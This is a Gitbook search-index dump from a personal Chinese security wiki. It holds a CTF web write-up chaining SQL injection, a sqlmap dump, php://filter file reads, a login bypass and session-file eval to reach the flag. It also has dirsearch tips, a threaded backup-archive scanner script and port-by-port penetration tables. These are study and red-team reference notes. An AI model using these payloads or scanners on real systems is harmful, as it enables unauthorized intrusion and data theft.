{"./":{"url":"./","title":"Introduction","keywords":"","body":"1. Introduction 个人的技能树，希望积累下来，保持更新 2. 关于我 Github: https://github.com/R1card0-tutu Blog: https://r1card0-tutu.github.io/ 3. 待续 Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-07-01 15:10:51 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"CTF/2022年海事局比赛/WEB/ezlogin.html":{"url":"CTF/2022年海事局比赛/WEB/ezlogin.html","title":"Ezlogin","keywords":"","body":"0x01 登录框注入 sqlmap一把梭 POST /verification.php HTTP/1.1 Host: 39.104.50.15:33277 Content-Length: 29 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://39.104.50.15:33277 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://39.104.50.15:33277/login.php Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8 Cookie: PHPSESSID=86bjgupkc5k81qjanefmq3q7c6; user_pref=%2F Connection: close username=admin'+AND+(SELECT+7013+FROM+(SELECT(SLEEP(5)))tjwJ)--+CtWG&password=123456 sqlmap -r web.txt --batch --random-agent -v 3 --level 3 --risk 3 --threads 5 -D ctf_cl -T admin_user -C \"id,username,pass,email\" --dump 0x02 后台文件读取 POST /bigcarhome.php HTTP/1.1 Host: 39.104.50.15:33277 Content-Length: 70 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://39.104.50.15:33277 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://39.104.50.15:33277/bigcarhome.php Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: PHPSESSID=e4fl469gljdinq86049t799k0u; user_pref=%2F Connection: close search=php://filter/read=convert.base64-encode/resource=bigcarhome.php bigcarhome.php源码 ?????文件管理🌟欢迎回来!???????后台文件管理系统?退出????Home!?欢迎回来!!! -->??? ?? ?? ?Search? ????\";?echo \"\";?}?include($page);??>?????????????????????小汽车🚗开起来，嘟嘟嘟嘟～～～～～～～??? search输入值会被文件包含 读取verification.php源码 POST /bigcarhome.php HTTP/1.1 Host: 39.104.50.15:33277 Content-Length: 72 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://39.104.50.15:33277 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://39.104.50.15:33277/bigcarhome.php Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: PHPSESSID=e4fl469gljdinq86049t799k0u; user_pref=%2F Connection: close search=php://filter/read=convert.base64-encode/resource=verification.php 源码 alert('hackè¡ä¸º')\"); } return $var; } session_start(); $DATABASE_HOST = '127.0.0.1'; $DATABASE_USER = 'root'; $DATABASE_PASS = 'root'; $DATABASE_NAME = 'ctf_cl'; $con = mysqli_connect($DATABASE_HOST, $DATABASE_USER, $DATABASE_PASS, $DATABASE_NAME); if ( mysqli_connect_errno() ) { die ('Failed to connect to MySQL: ' . mysqli_connect_error()); } if ( !isset($_POST['username'], $_POST['password']) ) { header('Location: home.php'); } $uname = waf($_POST['username']); $passwd = waf($_POST['password']); $smt=\"SELECT * FROM admin_user WHERE username='$uname' and pass='$passwd'\"; $result=mysqli_query($con,$smt); $row = mysqli_fetch_array($result,MYSQLI_NUM); if ($row) { session_regenerate_id(); $_SESSION['loggedin'] = TRUE; $_SESSION['name'] = $_POST['username']; $_SESSION['id'] = $id; setcookie('user_pref','/',time() + (86400 * 30), \"/\"); header('Location: bigcarhome.php'); } elseif ($_POST['password'] == \"admin\") { echo \"Password or username is not correct.\"; header('Location: login.php'); }else { echo \"Password or username is not correct.\"; header('Location: login.php'); } ?> 登录成功username会写入session，写入到/tmp目录下，读取index.php源码发现phpinfo，发现disablefunction里面没禁用eval与scandir index.php源码 13) { die(\"$c too long\"); } if ( preg_match('/[a-z0-9]||\\\\?|\\\\[|\\\\]|\\\\*|@|\\\\||\\\\^|~|&|\\s/i', $cmd) ) { die(\"nonono\"); } eval( \"print($cmd);\" ); } else { exit(); } 写入eval到session文件 POST /verification.php HTTP/1.1 Host: 39.104.50.15:33277 Content-Length: 69 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://39.104.50.15:33277 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://39.104.50.15:33277/login.php Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8 Connection: close username=&password=admin'%20||%201=1--%201 列目录读取根目录flag文件名 POST /bigcarhome.php?a=var_dump(scandir('/')); HTTP/1.1 Host: 39.104.50.15:33277 Content-Length: 43 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://39.104.50.15:33277 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://39.104.50.15:33277/bigcarhome.php Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: PHPSESSID=e4fl469gljdinq86049t799k0u; user_pref=%2F Connection: close search=/tmp/sess_tl3hqon8u43nt22gchhmf4ja43 读取flag值 POST /bigcarhome.php?a=var_dump(file_get_contents('/ohhhyoufindflag')); HTTP/1.1 Host: 39.104.50.15:33277 Content-Length: 43 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://39.104.50.15:33277 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://39.104.50.15:33277/bigcarhome.php Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: PHPSESSID=e4fl469gljdinq86049t799k0u; user_pref=%2F Connection: close search=/tmp/sess_tl3hqon8u43nt22gchhmf4ja43 Tips 前台注入 万能密码绕过or || session文件包含 php7 session文件默认目录猜测 scandir函数列目录 Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-30 14:07:16 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"代码审计/01.Java代码审计/":{"url":"代码审计/01.Java代码审计/","title":"01.Java代码审计","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"代码审计/02.PHP代码审计/":{"url":"代码审计/02.PHP代码审计/","title":"02.PHP代码审计","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"代码审计/03.Golang代码审计/":{"url":"代码审计/03.Golang代码审计/","title":"03.Golang代码审计","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"区块链安全/01.合约审计/":{"url":"区块链安全/01.合约审计/","title":"01.合约审计","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"区块链安全/02.漏洞分析/":{"url":"区块链安全/02.漏洞分析/","title":"02.漏洞分析","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"区块链安全/03.金融知识/":{"url":"区块链安全/03.金融知识/","title":"03.金融知识","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/":{"url":"红蓝对抗/","title":"红蓝对抗","keywords":"","body":"0x01 2022年6月 博客、wiki搭建完成 知识框架第一次整理 0x02 2022年7月 开始梳理红蓝对抗打点篇章内容 Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-07-15 15:08:08 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/01.打点/00.隐藏自己/":{"url":"红蓝对抗/01.打点/00.隐藏自己/","title":"00.隐藏自己","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/01.打点/01.信息收集/":{"url":"红蓝对抗/01.打点/01.信息收集/","title":"01.信息收集","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/01.打点/01.信息收集/10.目录扫描/01dirsearch+fuzzDicts.html":{"url":"红蓝对抗/01.打点/01.信息收集/10.目录扫描/01dirsearch+fuzzDicts.html","title":"01 Dirsearch Fuzz Dicts","keywords":"","body":"0x01 前言 目录扫描的工具太多，除了御剑叔叔的GUI唯独钟爱dirsearch，简单介绍下自己常用的dirsearch扫描参数，拒绝扫不动 0x01 dirsearch常用命令 安装 git clone https://github.com/maurosoria/dirsearch.git 基础扫描 python3 dirsearch.py -f php,html,js -u https://target -t 20 -r -R 3 --recursion-status 200-403 --timeout 3 --retries 1 --random-agents -w ./dic/path 暴力递归与强制递归 --force-recursive --deep-recursive 递归排除静态目录 --exclude-subdirs image/,media/,css/ 为字典添加前戳i --prefixes .,admin,_ 为字典添加后戳 -suffixes ~,? 当扫描很慢时 --timeout 3 --retries 1 0x02 常用字典 https://github.com/TheKingOfDuck/fuzzDicts 上面的字典分门别类的为我们整理好了各种字典 思路: 利用dirsearc的-r参数对可能存在的目录进行一级一级的fuzz,尽可能多的发现漏洞问题 命令: python dirsearch.py -u 网址+存在路径 -e jsp -r -w 字典 0x03 洞来 项目主域名是个oss，直接访问直接403 默认参数扫描只能扫出来一些 0B \\bak\\ 0b \\download\\ 0b \\APP\\ 0b \\css\\ 使用调优的参数进行扫描 扫到的一个robots.txt 主业务主域名的sitemap，爆破当前业务主域名的子域名发现test测试系统域名 点点点，洞来 Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-07-15 15:10:56 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/01.打点/01.信息收集/10.目录扫描/02备份扫描.html":{"url":"红蓝对抗/01.打点/01.信息收集/10.目录扫描/02备份扫描.html","title":"02备份扫描","keywords":"","body":"0x01 备份扫描 推荐 https://github.com/sry309/ihoneyBakFileScan 工具核心原理 1. 常见后缀： * '.rar', '.zip', '.gz', '.sql.gz', '.tar.gz' ... 2. 文件头识别: * rar:526172211a0700cf9073 * zip:504b0304140000000800 * gz：1f8b080000000000000b，也包括'.sql.gz'，取'1f8b0800' 作为keyword * tar.gz: 1f8b0800 * sql：每种导出方式有不同的文件头 * Adminer： * mysqldump： * phpMyAdmin： * navicat： 3. 数据库备份导出方式识别： * 导出方式 文件头字符: 前10个16进制字符： * mysqldump: -- MySQL dump: 2d2d204d7953514c * phpMyAdmin: -- phpMyAdmin SQL Dump: 2d2d207068704d794164 * navicat: /* Navicat : 2f2a0a204e617669636174 * Adminer: -- Adminer x.x.x MySQL dump: 2d2d2041646d696e6572 (5月9日新增xxx.sql) * Navicat MySQL Data Transfer: /* Navicat: 2f2a0a4e617669636174 * 一种未知导出方式: -- -------: 2d2d202d2d2d2d2d2d2d 4. 根据域名自动生成相关扫描字典: ➜ ihoneyBakFileScan python3.5 ihoneyBakFileScan.py -u https://www.ihoney.net.cn [ ] https://www.ihoney.net.cn/__zep__/js.zip [ ] https://www.ihoney.net.cn/faisunzip.zip [ ] https://www.ihoney.net.cn/www.ihoney.net.cn.rar [ ] https://www.ihoney.net.cn/wwwihoneynetcn.rar 0x02 改良版 速度更快 import logging import socket import threading from binascii import b2a_hex from concurrent.futures import ThreadPoolExecutor, wait, ALL_COMPLETED, FIRST_COMPLETED from urllib.parse import urlparse from datetime import datetime import requests as requests import inspect import ctypes def _async_raise(tid, exctype): \"\"\"raises the exception, performs cleanup if needed\"\"\" tid = ctypes.c_long(tid) if not inspect.isclass(exctype): exctype = type(exctype) res = ctypes.pythonapi.PyThreadState_SetAsyncExc(tid, ctypes.py_object(exctype)) if res == 0: raise ValueError(\"invalid thread id\") elif res != 1: # \"\"\"if it returns a number greater than one, you're in trouble, # and you should call it again with exc=NULL to revert the effect\"\"\" ctypes.pythonapi.PyThreadState_SetAsyncExc(tid, None) raise SystemError(\"PyThreadState_SetAsyncExc failed\") def stop_thread(thread): _async_raise(thread.ident, SystemExit) requests.packages.urllib3.disable_warnings() import requests def getIP(domain): myaddr = socket.getaddrinfo(domain, 'http') return myaddr[0][4][0] def vlun(urltarget, df,req): mu=urltarget try: try: r = req.head(url=mu, headers=headers, timeout=timeout, allow_redirects=False, stream=True, verify=False) except Exception as e: return 1 content = b2a_hex(r.raw.read(10)).decode() print(r.status_code) rarsize = int(r.headers.get('Content-Length')) r.close() if rarsize >= 1024000000: unit = int(rarsize) // 1024 rarsize = str(unit) + 'G' rarsize2 = unit elif rarsize >= 1024000: unit = int(rarsize) // 1024 rarsize = str(unit) + 'M' rarsize2 = unit else: unit = int(rarsize) // 1024 rarsize = str(unit) + 'K' rarsize2 = unit if rarsize2 > 100: logging.warning('[*] {} size:{}'.format(urltarget, rarsize)) with open(df, 'a') as f: try: if (rarsize2 > 5000): f.write(str(mu) + '\\n') return \"1\" except: pass else: pass except Exception as e: pass def list_of_groups(init_list, childern_list_len): list_of_groups = zip(*(iter(init_list),) *childern_list_len) end_list = [list(i) for i in list_of_groups] count = len(init_list) % childern_list_len end_list.append(init_list[-count:]) if count !=0 else end_list return end_list def urlcheck(target=None, ulist=None): if target is not None and ulist is not None: if target.startswith('http://') or target.startswith('https://'): if target.endswith('/'): ulist.append(target) else: ulist.append(target + '/') else: line = 'http://' + target try: f1 = requests.head(line, timeout=5) if ('301' in str(f1.status_code)): line = 'https://' + target except Exception as e: print(e) if line.endswith('/'): ulist.append(line) else: ulist.append(line + '/') return ulist def a(u): # ucp = u.strip('https://').strip('http://') if u.startswith('http://'): ucp = u.lstrip('http://') elif u.startswith('https://'): ucp = u.lstrip('https://') if '/' in ucp: ucp = ucp.split('/')[0] if ':' in ucp: cport = ucp.split(':')[1] ucp = ucp.split(':')[0] www1 = ucp.split('.') else: www1 = ucp.split('.') wwwlen = len(www1) wwwhost = '' for i in range(1, wwwlen): wwwhost += www1[i] current_info_dic = [] # deep copy suffixFormat = ['rar', 'zip', 'gz', 'tar.gz'] domainDic = [ucp + '.', ucp.replace('.', '') + '.', 'wz.', 'sql.', 'wwwroot.', 'index.', 'old.', 'web.', 'database.', 'upload.', 'website.', 'wangzhan.', 'package.', 'test.', 'bin.', 'ftp.', 'output.', 'config.', '网站备份.', '网站.', '数据库.', '数据库备份.', 'sjk.', 'shujuku.', 'backup.', 'faisunzip.', '1.', '2.', '3.', '4.', '5.', '6.', '7.', '8.', '9.', '666.', '777.', '888.', '999.', '234.', '555.', '333.', '444.', 'admin.', 'db.', 'test.', '123.', 'admin.', 'root.', 'data.', '666.', '111.', 'beifen.', 'b.', 'template.', 'install.', 'core.', 'about.', 'cache.', 'download.', 'runtime.', 'a.', 'img.', 'include.', '000.', '00.', '0.', '012.', 'application.', 'server', 'extend.', 'vendor.', 'app.', 'public.' 'bf.', wwwhost + '.', ucp.split('.', 1)[-1] + '.', www1[0] + '.', www1[1] + '.'] for s in suffixFormat: for d in domainDic: current_info_dic.extend([d + s]) req = requests.session() for info in current_info_dic: url = str(u) + str(info) print(url) abn=vlun(url,datefile,req) if(abn==1): return req.close() return datefile = datetime.now().strftime('%Y%m%d_%H-%M-%S.txt') headers = {} timeout = 5 urllist=[] with open('url.txt',encoding='utf-8') as f: hj=f.readlines() for kkl2 in hj: c=kkl2.strip() if c.startswith(\"http\"): pass else: c = \"http://\" + c urllist.append(c+\"/\") print(len(urllist)) urllist = filter(None,urllist) pool = ThreadPoolExecutor(max_workers=800) all_task = [pool.submit(a, (u)) for u in urllist] wait(all_task, return_when=ALL_COMPLETED) Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-07-18 17:20:27 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/01.打点/01.信息收集/12.端口扫描/01端口对应渗透.html":{"url":"红蓝对抗/01.打点/01.信息收集/12.端口扫描/01端口对应渗透.html","title":"01端口对应渗透","keywords":"","body":" 端口 服务 渗透用途 tcp 20,21 FTP 允许匿名的上传下载,爆破,嗅探,win提权,远程执行(proftpd 1.3.5),各类后门(proftpd,vsftp 2.3.4) tcp 22 SSH 可根据已搜集到的信息尝试爆破,v1版本可中间人,ssh隧道及内网代理转发,文件传输等等 tcp 23 Telnet 爆破,嗅探,一般常用于路由,交换登陆,可尝试弱口令 tcp 25 SMTP 邮件伪造,vrfy/expn查询邮件用户信息,可使用smtp-user-enum工具来自动跑 tcp/udp 53 DNS 允许区域传送,dns劫持,缓存投毒,欺骗以及各种基于dns隧道的远控 tcp/udp 69 TFTP 尝试下载目标及其的各类重要配置文件 tcp 80-89,443,8440-8450,8080-8089 各种常用的Web服务端口 可尝试经典的topn,vpn,owa,webmail,目标oa,各类Java控制台,各类服务器Web管理面板,各类Web中间件漏洞利用,各类Web框架漏洞利用等等…… tcp 110 POP3 可尝试爆破,嗅探 tcp 111,2049 NFS 权限配置不当 tcp 137,139,445 Samba 可尝试爆破以及smb自身的各种远程执行类漏洞利用,如,ms08-067,ms17-010,嗅探等…… tcp 143 IMAP 可尝试爆破 udp 161 SNMP 爆破默认团队字符串,搜集目标内网信息 tcp 389 LDAP ldap注入,允许匿名访问,弱口令 tcp 512,513,514 Linux rexec 可爆破,rlogin登陆 tcp 873 Rsync 匿名访问,文件上传 tcp 1194 OpenVPN 想办法钓VPN账号,进内网 tcp 1352 Lotus 弱口令,信息泄漏,爆破 tcp 1433 SQL Server 注入,提权,sa弱口令,爆破 tcp 1521 Oracle tns爆破,注入,弹shell… tcp 1500 ISPmanager 弱口令 tcp 1723 PPTP 爆破,想办法钓VPN账号,进内网 tcp 2082,2083 cPanel 弱口令 tcp 2181 ZooKeeper 未授权访问 tcp 2601,2604 Zebra 默认密码zerbra tcp 3128 Squid 弱口令 tcp 3312,3311 kangle 弱口令 tcp 3306 MySQL 注入,提权,爆破 tcp 3389 Windows rdp shift后门[需要03以下的系统],爆破,ms12-020 tcp 3690 SVN svn泄露,未授权访问 tcp 4848 GlassFish 弱口令 tcp 5000 Sybase/DB2 爆破,注入 tcp 5432 PostgreSQL 爆破,注入,弱口令 tcp 5900,5901,5902 VNC 弱口令爆破 tcp 5984 CouchDB 未授权导致的任意指令执行 tcp 6379 Redis 可尝试未授权访问,弱口令爆破 tcp 7001,7002 WebLogic Java反序列化,弱口令 tcp 7778 Kloxo 主机面板登录 tcp 8000 Ajenti 弱口令 tcp 8443 Plesk 弱口令 tcp 8069 Zabbix 远程执行,SQL注入 tcp 8080-8089 Jenkins,JBoss 反序列化,控制台弱口令 tcp 9080-9081,9090 WebSphere Java反序列化/弱口令 tcp 9200,9300 ElasticSearch 远程执行 tcp 11211 Memcached 未授权访问 tcp 27017,27018 MongoDB 爆破,未授权访问 tcp 50070,50030 Hadoop 默认端口未授权访问 端口号 端口说明 渗透思路 21/69 FTP/TFTP：文件传输协议 爆破、内网嗅探 22 SSH：远程连接 用户名枚举、爆破 23 Telnet：远程连接 爆破、内网嗅探 25 SMTP：邮件服务 邮件伪造 53 DNS：域名系统 DNS域传送\\DNS缓存投毒\\DNS欺骗\\利用DNS隧道技术刺透防火墙 389 LDAP 未授权访问（通过LdapBrowser工具直接连入） 443 https服务 OpenSSL 心脏滴血（nmap -sV --script=ssl-heartbleed 目标） 445 SMB服务 ms17_010远程代码执行 873 rsync服务 未授权访问 1090/1099 Java-rmi JAVA反序列化远程命令执行漏洞 1352 Lotus Domino邮件服务 爆破：弱口令、信息泄漏：源代码 1433 MSSQL 注入、SA弱口令爆破、提权 1521 Oracle 注入、TNS爆破 2049 NFS 配置不当 2181 ZooKeeper服务 未授权访问 3306 MySQL 注入、爆破、写shell、提权 3389 RDP 爆破、Shift后门、CVE-2019-0708远程代码执行 4848 GlassFish控制台 爆破：控制台弱口令、认证绕过 5000 Sybase/DB2数据库 爆破、注入 5432 PostgreSQL 爆破弱口令、高权限执行系统命令 5632 PcAnywhere服务 爆破弱口令 5900 VNC 爆破：弱口令、认证绕过 6379 Redis 未授权访问、爆破弱口令 7001 WebLogic中间件 反序列化、控制台弱口令+部署war包、SSRF 8000 jdwp JDWP 远程命令执行漏洞（工具） 8080/8089 Tomcat/JBoss/Resin/Jetty/Jenkins 反序列化、控制台弱口令、未授权 8161 ActiveMQ admin/admin、任意文件写入、反序列化 8069 Zabbix 远程命令执行 9043 WebSphere控制台 控制台弱口令https://:9043/ibm/console/logon.jsp、远程代码执行 9200/9300 Elasticsearch服务 远程代码执行 11211 Memcache 未授权访问（nc -vv 目标 11211） 27017 MongoDB 未授权访问、爆破弱口令 50000 SAP 远程代码执行 50070 hadoop 未授权访问 端口号 服务 渗透思路 21 FTP/TFTP/VSFTPD 爆破/嗅探/溢出/后门 22 ssh远程连接 爆破/openssh漏洞 23 Telnet远程连接 爆破/嗅探/弱口令 25 SMTP邮件服务 邮件伪造 53 DNS域名解析系统 域传送/劫持/缓存投毒/欺骗 67/68 dhcp服务 劫持/欺骗 110 pop3 爆破/嗅探 139 Samba服务 爆破/未授权访问/远程命令执行 143 Imap协议 爆破161SNMP协议爆破/搜集目标内网信息 389 Ldap目录访问协议 注入/未授权访问/弱口令 445 smb ms17-010/端口溢出 512/513/514 Linux Rexec服务 爆破/Rlogin登陆 873 Rsync服务 文件上传/未授权访问 1080 socket 爆破 1352 Lotus domino邮件服务 爆破/信息泄漏 1433 mssql 爆破/注入/SA弱口令 1521 oracle 爆破/注入/TNS爆破/反弹shell2049Nfs服务配置不当 2181 zookeeper服务 未授权访问 2375 docker remote api 未授权访问 3306 mysql 爆破/注入 3389 Rdp远程桌面链接 爆破/shift后门 4848 GlassFish控制台 爆破/认证绕过 5000 sybase/DB2数据库 爆破/注入/提权 5432 postgresql 爆破/注入/缓冲区溢出 5632 pcanywhere服务 抓密码/代码执行 5900 vnc 爆破/认证绕过 6379 Redis数据库 未授权访问/爆破 7001/7002 weblogic java反序列化/控制台弱口令 80/443 http/https web应用漏洞/心脏滴血 8069 zabbix服务 远程命令执行/注入 8161 activemq 弱口令/写文件 8080/8089 Jboss/Tomcat/Resin 爆破/PUT文件上传/反序列化 8083/8086 influxDB 未授权访问 9000 fastcgi 远程命令执行 9090 Websphere 控制台爆破/java反序列化/弱口令 9200/9300 elasticsearch 远程代码执行 11211 memcached 未授权访问 27017/27018 mongodb 未授权访问/爆破 端口号 服务 渗透思路 20 ftp_data 爆破、嗅探、溢出、后门 21 ftp_control 爆破、嗅探、溢出、后门 23 telnet 爆破、嗅探 25 smtp 邮件伪造 53 DNS DNS区域传输、DNS劫持、DNS缓存投毒、DNS欺骗、深度利用：利用DNS隧道技术刺透防火墙 67 dhcp 劫持、欺骗 68 dhcp 劫持、欺骗 110 pop3 爆破 139 samba 爆破、未授权访问、远程代码执行 143 imap 爆破 161 snmp 爆破 389 ldap 注入攻击、未授权访问 512 linux r 直接使用rlogin 513 linux r 直接使用rlogin 514 linux r 直接使用rlogin 873 rsync 未授权访问 888 BTLINUX 宝塔Linux主机管理后台/默认帐户：admin｜默认密码：admin 999 PMA 护卫神佩带的phpmyadmin管理后台，默认帐户：root｜默认密码：huweishen.com 1080 socket 爆破：进行内网渗透 1352 lotus 爆破：弱口令、信息泄露：源代码 1433 mssql 爆破：使用系统用户登录、注入攻击 1521 oracle 爆破：TNS、注入攻击 2049 nfs 配置不当 2181 zookeeper 未授权访问 3306 mysql 爆破、拒绝服务、注入 3389 rdp 爆破、Shift后门 4848 glassfish 爆破：控制台弱口令、认证绕过 5000 sybase/DB2 爆破、注入 5432 postgresql 缓冲区溢出、注入攻击、爆破：弱口令 5632 pcanywhere 拒绝服务、代码执行 5900 vnc 爆破：弱口令、认证绕过 5901 vnc 爆破：弱口令、认证绕过 5902 vnc 爆破：弱口令、认证绕过 6379 redis 未授权访问、爆破：弱口令 7001 weblogic JAVA反序列化、控制台弱口令、控制台部署webshell 7002 weblogic JAVA反序列化、控制台弱口令、控制台部署webshell 80 web 常见Web攻击、控制台爆破、对应服务器版本漏洞 443 web 常见Web攻击、控制台爆破、对应服务器版本漏洞 8080 